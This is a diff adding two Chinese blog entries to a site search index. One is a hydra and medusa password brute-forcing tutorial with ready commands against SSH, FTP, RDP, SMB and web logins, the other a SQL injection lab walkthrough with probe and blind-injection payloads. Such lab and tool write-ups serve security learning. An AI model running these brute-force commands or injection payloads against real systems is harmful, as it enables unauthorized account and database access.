@@ -50,4 +50,62 @@
         <tag>DC</tag>
       </tags>
   </entry>
+  <entry>
+    <title>来自远古的爆破殿堂级神器</title>
+    <url>/shadowdevil-cc.github.io/2020/07/16/%E6%9D%A5%E8%87%AA%E8%BF%9C%E5%8F%A4%E7%9A%84%E7%88%86%E7%A0%B4%E6%AE%BF%E5%A0%82%E7%BA%A7%E7%A5%9E%E5%99%A8/</url>
+    <content><![CDATA[<h3 id="hydra–来自地狱的九头蛇"><a href="#hydra–来自地狱的九头蛇" class="headerlink" title="hydra–来自地狱的九头蛇"></a>hydra–来自地狱的九头蛇</h3><p>当然今天这里的九头蛇不是漫威里面的九头蛇组织，但作为一款爆破工具，是真的很bug的存在<br>大喊一声九头蛇万岁，不过分！！！</p>
+<a id="more"></a>
+<p>hydra的下载，自行百度，有手就行</p>
+<h2 id="hydra-的用法"><a href="#hydra-的用法" class="headerlink" title="hydra 的用法"></a>hydra 的用法</h2><p>有个记忆小技巧，用户名和密码前面的参数大小写取决于后面跟着是否是一个字典，是字典大小，不是小写<br>参数帮助列表<br>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]<br> [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]<br> -R 继续从上一次进度接着破解。-S 采用SSL链接。 -s PORT 可通过这个参数指定非默认端口  -l LOGIN 指定破解的用户，对特定用户破解。 -L FILE 指定用户名字典。 -p PASS 小写，指定密码破解，少用，一般是采用密码字典。 -P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。<br> -C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。<br> -M FILE 指定目标列表文件一行一条。<br> -o FILE 指定结果输出文件。<br> -f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br> -t TASKS 同时运行的线程数，默认为16。<br> -w TIME 设置最大超时的时间，单位秒，默认是30s。<br> -v / -V 显示详细过程。service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p>
+<p>1、破解ssh：<br>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e ns ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh</p>
+<p>2、破解ftp：<br>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV<br>hydra 120.27.50.146 ftp -l root -P pass.txt -t 16 -vV<br>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p>
+<p>3、get方式提交，破解web登录：<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</p>
+<p>4、post方式提交，破解web登录：<br>hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password”<br>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“<br>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）</title></p>
+<p>5、破解https：<br>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</p>
+<p>6、破解teamspeak：<br>hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</p>
+<p>7、破解cisco：<br>hydra -P pass.txt 10.36.16.18 cisco<br>hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</p>
+<p>8、破解smb：<br>hydra -l administrator -P pass.txt 10.36.16.18 smb</p>
+<p>9、破解pop3：<br>hydra -l muts -P pass.txt my.pop3.mail pop3</p>
+<p>10、破解rdp（破解3389端口）：<br>hydra ip rdp -l administrator -P pass.txt -V<br>eg:<br>其中命令：hydra 192.168.1.12 rdp -L users.txt -P pass.txt -V<br>192.168.12是目标服务器的IP地址<br>rdp 是协议<br>-L 指定一个帐号字典<br>-P 指定一个密码字典<br>-V 现实爆破测试的详细过程</p>
+<p>11、破解http-proxy：<br>hydra -l admin -P pass.txt http-proxy://10.36.16.18</p>
+<p>12、破解imap：<br>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN<br>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p>
+<h3 id="来自地狱的美女medusa"><a href="#来自地狱的美女medusa" class="headerlink" title="来自地狱的美女medusa"></a>来自地狱的美女medusa</h3><p>没错，就是希腊生活中的蛇身美女，让人如此着迷的同时又如此致命。<br>我喜欢叫，爆破美女，是不是很nice！？<br>下载自行百度，有手就行</p>
+<!-- more -->
+<h2 id="medusa用法"><a href="#medusa用法" class="headerlink" title="medusa用法"></a>medusa用法</h2><p>11:02</p>
+<p>用法：<br>Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<br>Medusa [-h 主机| -H 文件] [-u 用户名| -U 文件] [-p 密码| -P 文件] [-C 文件] -M 模块[OPT]</p>
+<p>-h [TEXT]：目标主机名或IP地址<br>-H [FILE]：包含目标主机名或IP地址的文件<br>-u [TEXT]：要测试的用户名<br>-U [FILE]：包含要测试的用户名的文件<br>-p [TEXT]：要测试的密码<br>-P [FILE]：包含要测试的密码的文件<br>-C [FILE]：包含组合条目的文件。有关更多信息，请参阅README。<br>-O [FILE]：将日志信息附加到的文件<br>-e [n / s / ns]：其他密码检查（n无密码，s 密码=用户名）<br>-M [TEXT]：要执行的模块的名称（不带.mod扩展名）<br>-m [TEXT]：传递给模块的参数。这可以通过一个多次传递不同的参数，并且它们全部被发送到模块（即，-m Param1 -m Param2等）<br>-d：转储所有已知的模块<br>-n [NUM]：用于非默认的TCP端口号<br>-s：启用SSL<br>-g [NUM]：尝试连接NUM秒后放弃（默认3）<br>-r [NUM]：在重试尝试之间休眠NUM秒（默认值3）<br>-R [NUM]：尝试NUM在放弃之前重试。总尝试次数将是NUM + 1。<br>-c [NUM]：在usec中等待以验证套接字的时间（缺省值为500 usec）。<br>-t [NUM]：要同时测试的登录总数<br>-T [NUM]：要同时测试的主机总数<br>-L：每个线程使用一个用户名并行登录。默认是处理整个用户名在继续之前。<br>-f：在找到第一个有效的用户名/密码后停止扫描主机。<br>-F：在任何主机上找到第一个有效的用户名/密码后停止审核。<br>-b：禁止启动横幅<br>-q：显示模块的使用信息<br>-v [NUM]：详细等级[0 - 6（更多）]<br>-w [NUM]：错误调试级别[0 - 10（更多）]<br>-V：显示版本<br>-Z [TEXT]：根据上次扫描的地图继续扫描 </p>
+<p>以下命令指示Medusa通过SMB服务对主机192.168.0.20上的单个用户（管理员）测试passwords.txt中列出的所有密码。“-e ns”指示美杜莎另外检查管理员帐户是否有一个空白密码或其密码设置为匹配其用户名（管理员）。</p>
+<p>medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt</p>
+<p>下面的命令行演示了如何执行Medusa的一些并行功能。这里至少有20个主机和10个用户同时进行测试。“-L”选项指示美杜莎由用户并行化。这意味着针对主机的10个线程中的每个线程都会检查唯一用户。</p>
+<p>medusa -H hosts.txt -U users.txt -P passwords.txt -T 20 -t 10 -L -F -M smbnt</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>理论上，只要爆破字典足够全，就没有拿不下的系统，但是有时候时间不等人鸭，所以拥有一款优秀的爆破神器和一款齐全的字典，是爆破鬼才们所必须的</p>
+<p>hydra 很好用，但很容易被waf检测，且不稳定。<br>而medusa相对稳定，功能更齐全。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli通关录1-20</title>
+    <url>/shadowdevil-cc.github.io/2020/06/27/sqli%E9%80%9A%E5%85%B3%E5%BD%951-9/</url>
+    <content><![CDATA[<h3 id="sqli注入的第一关"><a href="#sqli注入的第一关" class="headerlink" title="sqli注入的第一关"></a>sqli注入的第一关</h3><a id="more"></a>
+<p>sql注入判断：<br>payload:1’<br>返回结果:mysql报错：’’1’’ LIMIT 0,1’<br>重新构造：1’–+-<br>返回结果正常<br>判断为字符型注入型<br>接下来操作不用我多说了</p>
+<h3 id="sqli注入的第二关"><a href="#sqli注入的第二关" class="headerlink" title="sqli注入的第二关"></a>sqli注入的第二关</h3><p>sql注入判断：<br>payload:1’<br>返回结果:mysql报错：’’ LIMIT 0,1’<br>重新构造：1 –+-<br>返回结果正常<br>判断为数字注入型<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第三关"><a href="#sqli注入的第三关" class="headerlink" title="sqli注入的第三关"></a>sqli注入的第三关</h3><p>sql注入判断：<br>payload:1’<br>返回结果:mysql报错： ‘’1’’) LIMIT 0,1’<br>重新构造：1’)–+-<br>返回结果正常<br>判断为字符型注入型，与上面的字符型注入多了个括号闭合<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第四关"><a href="#sqli注入的第四关" class="headerlink" title="sqli注入的第四关"></a>sqli注入的第四关</h3><p>sql注入判断：<br>payload:1”<br>返回结果:mysql报错：’”1””) LIMIT 0,1’<br>重新构造：1”)–+-<br>返回结果正常<br>判断为字符型注入型，单引号报错和双引号报错注入都为字符型注入<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第5关"><a href="#sqli注入的第5关" class="headerlink" title="sqli注入的第5关"></a>sqli注入的第5关</h3><p>sql注入判断：<br>payload:1’<br>返回结果:mysql报错：’’1’’ LIMIT 0,1’<br>重新构造：1’–+-<br>返回结果正常<br>判断为字符型注入型<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第六关"><a href="#sqli注入的第六关" class="headerlink" title="sqli注入的第六关"></a>sqli注入的第六关</h3><p>sql注入判断：<br>payload:1”<br>返回结果:mysql报错： ‘“1”” LIMIT 0,1’<br>重新构造：1”–+-<br>返回结果正常<br>判断为字符型注入型<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第七关"><a href="#sqli注入的第七关" class="headerlink" title="sqli注入的第七关"></a>sqli注入的第七关</h3><p>sql注入判断：<br>payload:1’<br>返回结果:mysql报错： ‘’1’’)) LIMIT 0,1’<br>重新构造：1’))–+-<br>返回结果正常<br>判断为字符型注入型<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第八关"><a href="#sqli注入的第八关" class="headerlink" title="sqli注入的第八关"></a>sqli注入的第八关</h3><p>sql注入判断：<br>payload:1’<br>返回结果:false<br>重新构造：1’–+-<br>返回结果正常<br>判断为字符型盲注型<br>查数据库长度payload：1’ and length(database())&gt;5–+-<br>跑数据库名payload：1’ and ascii(substr(database(),1,2))&gt;0–+-<br>把database()替换成你想要查询的即可<br>接下来操作不要我多说了</p>
+<h3 id="sqli注入的第九关"><a href="#sqli注入的第九关" class="headerlink" title="sqli注入的第九关"></a>sqli注入的第九关</h3>]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
 </search>
